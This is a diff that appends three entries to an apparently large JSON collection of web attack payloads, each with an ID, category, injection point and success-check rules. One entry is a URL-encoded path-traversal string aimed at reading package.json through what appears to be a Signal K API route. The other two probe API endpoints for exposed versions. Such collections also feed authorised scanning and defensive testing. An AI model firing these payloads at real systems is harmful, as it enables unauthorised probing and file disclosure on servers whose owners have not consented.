@@ -28785,5 +28785,38 @@
       "expected_status_code": 200,
       "success_regex": "version|vulnerable"
     }
+  },
+  {
+    "payload_id": "OWP-474709",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/signalk/v2/api/resources/routes/..%2F..%2F..%2F..%2Fpackage.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474710",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/global/template/definitions",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
+  },
+  {
+    "payload_id": "OWP-474711",
+    "vulnerability_category": "Vulnerable & Outdated Components (CVE Paths)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/global/template/definitions?x=/api/system/status",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "version|vulnerable"
+    }
   }
 ]
